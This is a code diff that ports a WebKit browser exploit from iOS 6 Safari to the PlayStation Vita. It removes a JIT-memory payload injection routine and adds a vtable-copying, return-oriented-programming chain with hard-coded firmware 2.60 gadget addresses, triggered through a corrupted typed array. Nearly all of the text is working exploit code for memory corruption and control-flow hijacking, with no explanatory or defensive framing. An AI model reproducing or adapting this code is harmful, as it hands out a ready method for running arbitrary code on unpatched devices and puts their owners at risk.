@@ -6,7 +6,7 @@
 // global vars
 var _gc, _cnt = 0;
 
-function tryExpl_iOS32(att)
+function tryExpl_vita(att)
 {
 	try {      
     //
@@ -137,7 +137,7 @@ function tryExpl_iOS32(att)
 		//logAdd("u32[] data:<br/>" + ArrayToString(u32,0,16)); // for RnD
 		
 	//
-	//  Part 4: getting the JIT-code memory address
+	//  Part 4: copying vtable
 	//
 			
 		// find out the memory address of u32[0] (ArrayBufferView.m_baseAddress)
@@ -152,72 +152,31 @@ function tryExpl_iOS32(att)
 		var setU32 = function(addr,val) { 
 			return u32[(addr - u32base) >>> 2] = val; 	
 		}
-				
-		// read ((JSFunction)f).m_executable;
-		var jitObj = u32[8];
-		logAdd("JIT object = 0x" + jitObj.toString(16));
-		//logAdd(ArrayToString(u32, (jitObj - u32base) >>> 2, 32)); // for RnD
-	
-		// read ExecutableBase.m_jitCodeForCall
-		jitObj += 0x10;
-		var jitAddr = getU32(jitObj);
-		logAdd("JIT address = 0x" + jitAddr.toString(16));
-		if (!jitAddr) { logAdd("error: 4"); return 4; }
-		//logAdd(ArrayToU8String(u32, (jitAddr - u32base) >>> 2, 64)); // for RnD
-	
-	//
-	// Part 5: payload execution
-	//
 
-		// create "empty" payload for ARMv7 iOS
-		var payload = U8toU32(new Uint8Array([			
-			// custom part: empty payload (NOPs)
-			0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF, 
-			0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,
-			0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF, 
-			0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,
-			0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF, 
-			0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,
-			// ...			
-			// payload returns 123 // modify it to ensure that payload works :)
-			0x4F,0xF0,0x7B,0x00, 		// MOV.W   R0, #0x7B
-			0x4F,0xF0,0xFF,0x31, 		// MOV.W   R1, #0xFFFFFFFF
-			// mandatory part			
-			0x55,0xF8,0x28,0x5C,		// LDR.W   R5,[R5,#-0x28]	
-			0x70,0x47, 					// BX      LR
-			0x00,0xBF
-		]));
+		var vtable = getU32(u32addr);
 		
-		// choose some place in f() JIT memory for payload
-		var jaddr = jitAddr + 0x30; 
-		setU32(jitObj, jaddr);
-		logAdd("payload address = 0x" + jaddr.toString(16)); 	
-		
-		var res;	
-						
-		// copy payload into the f() JIT memory	
-		jaddr = (jaddr - u32base) >>> 2;
-		//logAdd("JIT data:<br/>" + ArrayToU8String(u32, jaddr, payload.length)); // for RnD
-		exchangeArrays(payload, u32, jaddr);  
-	   	ArrayToU8String(u32, jaddr, payload.length); // for JIT
-					
-		try {	
-			// call payload		
-			res = f();		
-		}catch(e){
-			logAdd("Error 5: " + e);
+		// copy vtable to writable memory (u32base)
+		for (var i = 0; i < 50; i++)
+		{
+			u32[i] = getU32(vtable+(i*4));
 		}
 		
-		// restore overwritten JIT memory
-		exchangeArrays(payload, u32, jaddr);
-		//logAdd("JIT data:<br/>" + ArrayToU8String(u32, jaddr, payload.length)); // for RnD		
+		u32[0] = u32base+0xA0;
 		
-		// restore JIT-code pointer
-		setU32(jitObj, jitAddr);
+		// 2.60 SPECIFIC GADGETS
+		u32[0x48/4] = 0x81A8A3C1;
+		u32[0xA8/4] = 0x81AE84D5;
+		u32[(0xA0+0xA4)/4] = 0x81EABC02|1;
 		
-		// check that payload returns 123
-		logAdd((res == 123 ? "Ok:":"Fail:") + " f() = " + res);		
-		if (res != 123) { return 9; } // error						
+		// BEGIN STACK
+		u32[3] = 0xB16B00B5; // this is new PC
+		
+		// write new vtable
+		u32[0x40000000-2] = u32addr >>> 0;
+		u32[0] = u32base;
+		
+		// BEGIN ROP AND ROLL
+		u32.toString(0xDEADBEEF, 0xDEADBEEF, 0xDEADBEEF);
 	}
 	catch(e) {
 	    logAdd("Error: " + e);
@@ -232,21 +191,7 @@ function btnClick()
 	try {   
 	    logAdd("======== Start ========");
 		
-		// check OS version
-		if (navigator.platform.charAt(0) != "i") { logAdd("<font color=red>This works for iOS 6.0 only!</>"); return; }
-		
-	    // check Safari version
-	    var vsn = navigator.userAgent;
-	    if (vsn.indexOf("/6.0 ") <= 0 && vsn.indexOf("/6.0.0") <= 0 && vsn.indexOf("/6.0.1") <= 0) { 
-	    	logAdd("<font color=red>Safari 6.0 or 6.0.1 is required!</>"); 
-	    	//return; 
-	    }
-		
-		// try several attempts to exploit
-		for(var i=1; i < 5; i++){
-			logAdd("<br/>Attempt #" + i + ":");
-			if (tryExpl_iOS32(i) == 0) break;			
-		}
+		tryExpl_vita(1);
 		
 		logAdd("<br/>========&nbsp;End &nbsp;========<br/><br/>");	
 	}
